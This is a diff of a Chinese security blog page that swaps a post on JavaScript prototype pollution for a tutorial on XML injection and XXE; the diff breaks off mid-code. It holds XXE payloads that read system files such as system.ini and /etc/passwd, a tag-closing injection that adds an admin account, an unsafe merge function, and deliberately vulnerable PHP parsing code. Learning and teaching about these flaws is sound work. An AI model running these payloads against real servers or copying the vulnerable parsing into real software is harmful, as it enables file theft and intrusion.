@@ -6,7 +6,7 @@
   <meta charset="utf-8">
   <!-- SEO相关 -->
   
-  <link rel="canonical" href="http://example.com/2024/05/30/原型链污染/"/>
+  <link rel="canonical" href="http://example.com/2024/06/06/xxe漏洞学习/"/>
   <!-- 渲染优化 -->
     <meta http-equiv='x-dns-prefetch-control' content='on' />
       <link rel='dns-prefetch' href='https://unpkg.com'>
@@ -33,19 +33,19 @@
 
   <!-- feed -->
   <!-- 页面元数据 -->
-  <title>原型链污染 - Jijoy的blog</title>
+  <title>XXE漏洞学习 - Jijoy的blog</title>
   <meta name="keywords" content="null">
   <meta desc name="description" content="Jijoy的blog - Jijoy - Jijoy的blog">
   
 <meta property="og:type" content="article">
-<meta property="og:title" content="原型链污染">
-<meta property="og:url" content="http://example.com/2024/05/30/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/index.html">
+<meta property="og:title" content="XXE漏洞学习">
+<meta property="og:url" content="http://example.com/2024/06/06/XXE%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/index.html">
 <meta property="og:site_name" content="Jijoy的blog">
-<meta property="og:description" content="原型链污染前面有两张博客对 JS 的继承和原型链进行了一个比较详细的解释，那么原型链污染也就比较好理解了 简单的说，就是我们控制私有属性(__proto__)指向的原型对象（prototype），将其的属性产生变更，那么所继承它的对象也会拥有这个属性 举一个最简单的例子  这里我们对Object1的原型进行属性设置，当我们执行console.log(object1.foo);时，会找到原型中的的f">
+<meta property="og:description" content="xxe漏洞学习之前在做node.js 的题目的时候发现很多node.js的题目都是和xxe的结合起来，所以这里决定先来看一下xxe的知识点 XXE：全称为XML Enternal Entity Injection，中文名称：XML外部实体注入 既然是XML的漏洞，我们就先来看XML的基础知识点 XML基础声明文档 1&lt;?xml version&#x3D;&quot;1.0&quot; encoding">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
-<meta property="article:published_time" content="2024-05-30T12:26:39.000Z">
-<meta property="article:modified_time" content="2024-05-31T13:38:11.357Z">
+<meta property="article:published_time" content="2024-06-06T11:56:10.000Z">
+<meta property="article:modified_time" content="2024-06-09T03:12:07.263Z">
 <meta property="article:author" content="Jijoy">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
@@ -2356,7 +2356,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
           
 <div id="l_main" class=''>
   <article itemscope itemtype="http://schema.org/Article" class="article post white-box reveal md shadow floatable blur article-type-post" id="post" itemscope itemprop="blogPost">
-  <link itemprop="mainEntityOfPage" href="http://example.com/2024/05/30/原型链污染/">
+  <link itemprop="mainEntityOfPage" href="http://example.com/2024/06/06/XXE漏洞学习/">
   <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
     <meta itemprop="name" content="Jijoy的blog">
   </span>
@@ -2377,7 +2377,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     
     
       <h1 class="title" itemprop="name headline">
-        原型链污染
+        XXE漏洞学习
       </h1>
       <div class='new-meta-box'>
         
@@ -2398,10 +2398,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
           
         
           
-            <div class="new-meta-item date" itemprop="dateCreated datePublished" datetime="2024-05-30T20:26:39+08:00">
+            <div class="new-meta-item date" itemprop="dateCreated datePublished" datetime="2024-06-06T19:56:10+08:00">
   <a class='notlink'>
     <i class="fa-solid fa-calendar-alt fa-fw" aria-hidden="true"></i>
-    <p>发布于：May 30, 2024</p>
+    <p>发布于：Jun 6, 2024</p>
   </a>
 </div>
 
@@ -2424,33 +2424,144 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
   <div id="layoutHelper-page-plugins"></div>
   <div id="post-body" itemprop="articleBody">
-    <h2 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h2><p>前面有两张博客对 JS 的继承和原型链进行了一个比较详细的解释，那么原型链污染也就比较好理解了</p>
-<p>简单的说，就是我们控制私有属性(<code>__proto__</code>)指向的原型对象（<strong>prototype</strong>），将其的属性产生变更，那么所继承它的对象也会拥有这个属性</p>
-<p>举一个最简单的例子</p>
-<p><img src="/../image/579.png" class="lazyload" data-srcset="/../image/579.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="579"></p>
-<p>这里我们对Object1的原型进行属性设置，当我们执行<code>console.log(object1.foo);</code>时，会找到原型中的的<strong>foo</strong>属性，从而输出Hello World，但这里很神奇的的就是我们并没有对Object2进行操作，但当他执行<code>console.log(object2.foo);</code>同样也是输出Hello World，这里用到的就是我们现在要理解的重点<strong>原型链污染</strong></p>
-<p>这里对这个进行一个简单的解释，由于Object1和Object2的原型都为<strong>Object.prototype</strong>，两者同时继承了<strong>Object.prototype</strong>的属性，那导致当从Object1进入修改原型属性时，Object2的原型属性同时也被修改，而根据 JS 语法的特性，当无法在该实例中查找到的属性，将会在实例的原型中去查找，这也就导致了<code>console.log(object2.foo);</code>为<code>Hello World</code></p>
-<p>这个就是最基础的原型链污染</p>
-<p>js审计如果看见merge，clone函数，可以往原型链污染靠，跟进找一下关键的函数，找污染点，切记一定要让其__proto__解析为一个键名</p>
-<p>因为利用原型链污染需要设置设置<code>__proto__</code>的值，也就是需要找到能够控制数组（对象）的“键名”的操作，所有最常见的就是merge（函数合并），clone（函数克隆），copy（函数克隆）等函数</p>
-<p>这里简单定义以一个<strong>merge</strong>函数举个例</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function merge(target, source) &#123;</span><br><span class="line">    for (let key in source) &#123;</span><br><span class="line">        if (key in source &amp;&amp; key in target) &#123;</span><br><span class="line">            merge(target[key], source[key])</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+    <h2 id="xxe漏洞学习"><a href="#xxe漏洞学习" class="headerlink" title="xxe漏洞学习"></a>xxe漏洞学习</h2><p>之前在做node.js 的题目的时候发现很多node.js的题目都是和xxe的结合起来，所以这里决定先来看一下xxe的知识点</p>
+<p>XXE：全称为XML Enternal Entity Injection，中文名称：XML外部实体注入</p>
+<p>既然是XML的漏洞，我们就先来看XML的基础知识点</p>
+<h3 id="XML基础"><a href="#XML基础" class="headerlink" title="XML基础"></a>XML基础</h3><p>声明文档</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br></pre></td></tr></table></figure>
 
-<p>我们先简单看到<strong>merge</strong>函数的性质，他其实就是一个合并对象，将两个对象中的属性相互合并</p>
-<p>我们仔细审计代码就可以发现<code>target[key] = source[key]</code>这段代码存在一个赋值，那么如果我们将这个<strong>key</strong>的值修改为**<em>_proto</em>_**，那么不就可以进行原型链污染了</p>
-<p><img src="/../image/583.png" class="lazyload" data-srcset="/../image/583.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="583"></p>
-<p>我们可以发现这里已经完成了原型链的污染， clone和copy的函数克隆与这个原理基本一致，这里就不做过多的讲述</p>
-<h2 id="Javascript大小写特性"><a href="#Javascript大小写特性" class="headerlink" title="Javascript大小写特性"></a>Javascript大小写特性</h2><p>toUpperCase()是javascript中将小写转换成大写的函数。toLowerCase()是javascript中将大写转换成小写的函数</p>
-<p>我们来看一下toUpperCase功能，这里直接搬抄一段网上的一段代码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">if (!String.fromCodePoint) &#123;</span><br><span class="line">	(function() &#123;</span><br><span class="line">		var defineProperty = (function() &#123;</span><br><span class="line">			// IE 8 only supports `Object.defineProperty` on DOM elements</span><br><span class="line">			try &#123;</span><br><span class="line">				var object = &#123;&#125;;</span><br><span class="line">				var $defineProperty = Object.defineProperty;</span><br><span class="line">				var result = $defineProperty(object, object, object) &amp;&amp; $defineProperty;</span><br><span class="line">			&#125; catch(error) &#123;&#125;</span><br><span class="line">			return result;</span><br><span class="line">		&#125;());</span><br><span class="line">		var stringFromCharCode = String.fromCharCode;</span><br><span class="line">		var floor = Math.floor;</span><br><span class="line">		var fromCodePoint = function() &#123;</span><br><span class="line">			var MAX_SIZE = 0x4000;</span><br><span class="line">			var codeUnits = [];</span><br><span class="line">			var highSurrogate;</span><br><span class="line">			var lowSurrogate;</span><br><span class="line">			var index = -1;</span><br><span class="line">			var length = arguments.length;</span><br><span class="line">			if (!length) &#123;</span><br><span class="line">				return &#x27;&#x27;;</span><br><span class="line">			&#125;</span><br><span class="line">			var result = &#x27;&#x27;;</span><br><span class="line">			while (++index &lt; length) &#123;</span><br><span class="line">				var codePoint = Number(arguments[index]);</span><br><span class="line">				if (</span><br><span class="line">					!isFinite(codePoint) || // `NaN`, `+Infinity`, or `-Infinity`</span><br><span class="line">					codePoint &lt; 0 || // not a valid Unicode code point</span><br><span class="line">					codePoint &gt; 0x10FFFF || // not a valid Unicode code point</span><br><span class="line">					floor(codePoint) != codePoint // not an integer</span><br><span class="line">				) &#123;</span><br><span class="line">					throw RangeError(&#x27;Invalid code point: &#x27; + codePoint);</span><br><span class="line">				&#125;</span><br><span class="line">				if (codePoint &lt;= 0xFFFF) &#123; // BMP code point</span><br><span class="line">					codeUnits.push(codePoint);</span><br><span class="line">				&#125; else &#123; // Astral code point; split in surrogate halves</span><br><span class="line">					// http://mathiasbynens.be/notes/javascript-encoding#surrogate-formulae</span><br><span class="line">					codePoint -= 0x10000;</span><br><span class="line">					highSurrogate = (codePoint &gt;&gt; 10) + 0xD800;</span><br><span class="line">					lowSurrogate = (codePoint % 0x400) + 0xDC00;</span><br><span class="line">					codeUnits.push(highSurrogate, lowSurrogate);</span><br><span class="line">				&#125;</span><br><span class="line">				if (index + 1 == length || codeUnits.length &gt; MAX_SIZE) &#123;</span><br><span class="line">					result += stringFromCharCode.apply(null, codeUnits);</span><br><span class="line">					codeUnits.length = 0;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			return result;</span><br><span class="line">		&#125;;</span><br><span class="line">		if (defineProperty) &#123;</span><br><span class="line">			defineProperty(String, &#x27;fromCodePoint&#x27;, &#123;</span><br><span class="line">				&#x27;value&#x27;: fromCodePoint,</span><br><span class="line">				&#x27;configurable&#x27;: true,</span><br><span class="line">				&#x27;writable&#x27;: true</span><br><span class="line">			&#125;);</span><br><span class="line">		&#125; else &#123;</span><br><span class="line">			String.fromCodePoint = fromCodePoint;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;());</span><br><span class="line">&#125;</span><br><span class="line">for (var j = &#x27;A&#x27;.charCodeAt(); j &lt;= &#x27;Z&#x27;.charCodeAt(); j++)&#123;</span><br><span class="line">	var s = String.fromCodePoint(j);</span><br><span class="line">	for (var i = 0; i &lt; 0x10FFFF; i++) &#123;</span><br><span class="line">		var e = String.fromCodePoint(i);</span><br><span class="line">		if (s == e.toUpperCase() &amp;&amp; s != e) &#123;</span><br><span class="line">			document.write(&quot;char: &quot;+e+&quot;&lt;br/&gt;&quot;);</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<ul>
+<li>XML 指可扩展标记语言（EXtensible Markup Language）。</li>
+<li>XML 是一种很像HTML的标记语言。</li>
+<li>XML 的设计宗旨是传输数据，而不是显示数据。</li>
+<li>XML 标签没有被预定义。您需要自行定义标签。</li>
+<li>XML 被设计为具有自我描述性。</li>
+</ul>
+</blockquote>
+<p>XML标签必须成对出现，有开始标签就需要有结束标签，这里以<name>举例</p>
+<ul>
+<li>开始标签：**<name>**</li>
+<li>结束标签：**</name>**</li>
+</ul>
+<p>我们前面说到XML 和 HTML 极度相似，但两者还是存在本质的区别的</p>
+<ul>
+<li>XML 被设计用来传输和存储数据，其焦点是数据的内容</li>
+<li>HTML 被设计用来显示数据，其焦点是数据的外观</li>
+</ul>
+<p>HTML 旨在显示信息，而 XML 旨在传输信息</p>
+<p>XML的基本格式是一种树结构，它从”根部”开始，然后扩展到”枝叶”</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;root&gt;</span><br><span class="line">  &lt;child&gt;</span><br><span class="line">    &lt;subchild&gt;.....&lt;/subchild&gt;</span><br><span class="line">  &lt;/child&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>
 
-<p>这里面出现了两个神奇的字符**”ı”<strong>、</strong>“ſ”**</p>
-<p><img src="/../image/580.png" class="lazyload" data-srcset="/../image/580.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="580"></p>
-<p>这两个字符的“大写”是I和S。也就是说”ı”.toUpperCase() &#x3D;&#x3D; ‘I’，”ſ”.toUpperCase() &#x3D;&#x3D; ‘S’</p>
-<p>通过这个小特性可以绕过一些限制</p>
-<p>同样的，toLowerCase也有同样的字符</p>
-<p><img src="/../image/581.jpg" class="lazyload" data-srcset="/../image/581.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="581"></p>
-<p> 这个”K”的“小写”字符是k，也就是”K”.toLowerCase() &#x3D;&#x3D; ‘k’</p>
+<p>XML 必须包含根元素，它是所有其他元素的父元素，上述root 就是根元素</p>
+<p>同样的，由于其和HTML语言的高度相似性，XML的元素也可以拥有属性，属性提供有关元素的附加信息，属性值必须加引号</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;person age=&quot;30&quot; gender=&quot;male&quot;&gt;.....&lt;/person&gt;</span><br></pre></td></tr></table></figure>
+
+<p>XML的元素和属性的作用相似，都是用于提供元素的信息</p>
+<p>但属性存在一定的劣势：</p>
+<ul>
+<li>属性不能包含多个值（元素可以）</li>
+<li>属性不能包含树结构（元素可以）</li>
+<li>属性不容易扩展（为未来的变化）</li>
+</ul>
+<p>因此，一般的设计逻辑是，元数据（有关数据的数据）应当存储为属性，而数据本身应当存储为元素</p>
+<p>当元素命名发生冲突时，可以利用前缀进行规避</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;h:table&gt;</span><br><span class="line">&lt;f:table&gt;</span><br></pre></td></tr></table></figure>
+
+<p>通过加入前缀设置命名空间，当命名空间被定义在元素的开始标签中时，所有带有相同前缀的子元素都会与同一个命名空间相关联</p>
+<p>合法的 XML 文档是”形式良好”的 XML 文档，这也符合文档类型定义（DTD）的规则</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE note SYSTEM &quot;Note.dtd&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>DOCTYPE 声明是对外部 DTD 文件的引用</p>
+<p>DTD 的目的是定义 XML 文档的结构。它使用一系列合法的元素来定义文档结构</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE note</span><br><span class="line">[</span><br><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>PCDATA类型</strong></p>
+<p>PCDATA的意思是被解析的字符数据。PCDATA是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。文本中的标签会被当作标记来处理，而实体会被展开。<br>被解析的字符数据不应当包含任何<code>&amp;</code>，<code>&lt;</code>，或者<code>&gt;</code>字符，需要用<code>&amp;</code> <code>&lt;</code> <code>&gt;</code>实体来分别替换</p>
+<p><strong>CDATA类型</strong><br>CDATA意思是字符数据，CDATA 是不会被解析器解析的文本，在这些文本中的标签不会被当作标记来对待，其中的实体也不会被展开</p>
+<p>XML的知识点就那么多，感觉挺简单的，那么，我们回到XXE漏洞上</p>
+<h3 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h3><p>当允许引用外部实体时，可通过构造恶意的XML内容，导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等后果。一般的XXE攻击，只有在服务器有回显或者报错的基础上才能使用XXE漏洞来读取服务器端文件</p>
+<p>也就是说，我们可以利用DTD来进行外部引用</p>
+<p>所以这里再重新来看一下DTD </p>
+<p><strong>内部声明DTD</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素名称 [元素声明]&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>引用外部DTD</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素名称 SYSTEM &quot;dtd路径&quot;&gt;</span><br><span class="line">&lt;!DOCTYPE 根元素 PUBLIC &quot;DTD名称&quot; &quot;DTD文档的URL&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>PHP引用外部实体常见的利用协议</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file:///etc/passwd</span><br><span class="line">http://url/file.txt</span><br><span class="line">php://filter/read=convert.base64-encode/resource=xxx.php</span><br></pre></td></tr></table></figure>
+
+<p><strong>DTD实体</strong></p>
+<blockquote>
+<p>实体是用于定义引用普通文本或特殊字符的快捷方式的变量<br>实体引用是对实体的引用<br>实体可在内部或外部进行声明</p>
+</blockquote>
+<p><em>按实体有无参分类，实体分为一般实体和参数实体</em><br><em>一般实体的声明</em>：<code>&lt;!ENTITY 实体名称 &quot;实体内容&quot;&gt;</code><br>引用一般实体的方法：<code>&amp;实体名称;</code></p>
+<p><em>参数实体的声明</em>：<code>&lt;!ENTITY % 实体名称 &quot;实体内容&quot;&gt;</code><br>引用参数实体的方法：<code>%实体名称;</code></p>
+<p>内部实体声明</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">DTD:</span><br><span class="line">&lt;!ENTITY writer &quot;Donald Duck.&quot;&gt;</span><br><span class="line">&lt;!ENTITY copyright &quot;Copyright example.com&quot;&gt;</span><br><span class="line">xml:</span><br><span class="line">&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt;</span><br></pre></td></tr></table></figure>
+
+<p>外部实体声明</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DTD:</span><br><span class="line">&lt;!ENTITY writer SYSTEM &quot;http://www.example.com/example.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY copyright SYSTEM &quot;http://www.example.com/example.dtd&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="XML注入"><a href="#XML注入" class="headerlink" title="XML注入"></a>XML注入</h4><p>通过利用闭合标签改写XML文件实现XML注入</p>
+<p><strong>XML注入前提条件</strong></p>
+<p>（1）用户能够控制数据的输入<br>（2）程序有拼凑的数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;manager&gt;</span><br><span class="line">    &lt;admin id=&quot;1&quot;&gt;</span><br><span class="line">    &lt;username&gt;admin&lt;/username&gt;</span><br><span class="line">    &lt;password&gt;admin&lt;/password&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/admin&gt;</span><br><span class="line">    &lt;admin id=&quot;2&quot;&gt;</span><br><span class="line">    &lt;username&gt;root&lt;/username&gt;</span><br><span class="line">    &lt;password&gt;root&lt;/password&gt;</span><br><span class="line">    &lt;/admin&gt;</span><br><span class="line">&lt;/manager&gt;</span><br></pre></td></tr></table></figure>
+
+<p>当<strong>root</strong>可以被控制时，构造<strong>root</strong>为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin &lt;/password&gt;&lt;/admin&gt;&lt;admin id=&quot;3&quot;&gt;&lt;name&gt;hack&lt;/name&gt;&lt;password&gt;hacker&lt;/password&gt;&lt;/admin&gt;</span><br></pre></td></tr></table></figure>
+
+<p>则原有XML被修改为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;manager&gt;</span><br><span class="line">    &lt;admin id=&quot;1&quot;&gt;</span><br><span class="line">    &lt;name&gt;admin&lt;/name&gt;</span><br><span class="line">    &lt;password&gt;admin&lt;/password&gt;</span><br><span class="line">    &lt;/admin&gt;</span><br><span class="line">    &lt;admin id=&quot;2&quot;&gt;</span><br><span class="line">    &lt;username&gt;root&lt;/username&gt;</span><br><span class="line">    &lt;password&gt;root&lt;/password&gt;</span><br><span class="line">    &lt;/admin&gt;</span><br><span class="line">    &lt;admin id=&quot;3&quot;&gt;</span><br><span class="line">    &lt;name&gt;hack&lt;/name&gt;</span><br><span class="line">    &lt;password&gt;hacker&lt;/password&gt;</span><br><span class="line">    &lt;/admin&gt;</span><br><span class="line">&lt;/manager&gt;</span><br></pre></td></tr></table></figure>
+
+<p>也就是我们实现了添加一个为<strong>hacker</strong>的管理员账户，简单来说，只要我们需要知道XML表的结构，去实现标签的闭合，我们构造输入语句，就可以实现注入</p>
+<h4 id="XML外部实体注入-XXE"><a href="#XML外部实体注入-XXE" class="headerlink" title="XML外部实体注入(XXE)"></a>XML外部实体注入(XXE)</h4><p>XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件和代码，造成<strong>任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击</strong>等危害</p>
+<p>XXE漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件</p>
+<p><strong>主要函数</strong></p>
+<p><strong>simplexml_load_string()</strong>  可以用来读取XML</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">libxml_disable_entity_loader (false);</span><br><span class="line">$xmlfile = file_get_contents(&#x27;php://input&#x27;);</span><br><span class="line">$dom = new DOMDocument();</span><br><span class="line">$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">$creds = simplexml_import_dom($dom);</span><br><span class="line">echo $creds;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE crdes [ &lt;!ENTITY xxe SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt; ]&gt;</span><br><span class="line">&lt;crdes&gt;&amp;xxe;&lt;/crdes&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/599.png" class="lazyload" data-srcset="/../image/599.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="599"></p>
+<p>很明显可以看到我们读取到了<code>system.ini</code>的内容</p>
+<p>这里对代码稍微做个解释</p>
+<ul>
+<li><code>file_get_contents</code>获取客户端输入内容</li>
+<li><code>new DOMDocument()</code>初始化XML解析器</li>
+<li><code>loadXML($xmlfile)</code>加载客户端输入的XML内容</li>
+<li><code>simplexml_import_dom($dom)</code>获取XML文档节点，如果成功则返回SimpleXMLElement对象，如果失败则返回FALSE。</li>
+<li>获取SimpleXMLElement对象中的节点XXE，然后输出XXE内容</li>
+</ul>
+<h4 id="XXE常见利用方式"><a href="#XXE常见利用方式" class="headerlink" title="XXE常见利用方式"></a>XXE常见利用方式</h4><h5 id="读取任意文件"><a href="#读取任意文件" class="headerlink" title="读取任意文件"></a>读取任意文件</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$USERNAME = &#x27;admin&#x27;; //账号</span><br><span class="line">$PASSWORD = &#x27;admin&#x27;; //密码</span><br><span class="line">$result = null;</span><br><span class="line">libxml_disable_entity_loader(false);</span><br><span class="line">$xmlfile = file_get_contents(&#x27;php://input&#x27;);</span><br><span class="line"></span><br><span class="line">try&#123;</span><br><span class="line">    $dom = new DOMDocument();</span><br><span class="line">    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">    $creds = simplexml_import_dom($dom);</span><br><span class="line">    $username = $creds-&gt;username;</span><br><span class="line">    $password = $creds-&gt;password;</span><br><span class="line">    if($username == $USERNAME &amp;&amp; $password == $PASSWORD)&#123;</span><br><span class="line">        $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,1,$username);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,0,$username);</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;catch(Exception $e)&#123;</span><br><span class="line">    $result = 